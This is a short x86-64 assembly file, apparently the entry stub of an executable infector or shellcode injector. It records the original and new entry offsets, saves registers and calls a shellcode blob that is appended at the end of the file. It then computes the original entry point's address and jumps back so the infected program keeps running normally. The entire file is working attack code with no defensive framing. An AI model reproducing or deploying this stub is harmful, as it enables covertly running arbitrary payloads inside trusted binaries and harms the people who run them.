.intel_syntax noprefix

base:
    jmp past

old_entry: /* original entry in file offset */
.long 0

new_entry: /* shellcode entry in file offset */
.long 0

past:
    push rdi                   /* Preserve registers */
    push rsi                   /* ditto */
    push rdx                   /* ditto */
    call shcd                  /* Call the shellcode */
    mov eax, [rip + old_entry] /* Get offset of real entry  */
    mov ebx, [rip + new_entry] /* Get offset of the entry of section of prelude in fill offset */
    sub rbx, rax               /* offset delta between the prelude and the real entry */
    lea r10, [rip + base]      /* Get vaddr of the prelude */
    sub r10, rbx               /* Subtract the delta from vaddr of the prelude to get the vaddr of real entry */
    pop rdx                    /* Restore registers */
    pop rsi                    /* ditto */
    pop rdi                    /* ditto */
    jmp r10                    /* Jump to real entry */

shcd:
/* shcd blob is appended to here */
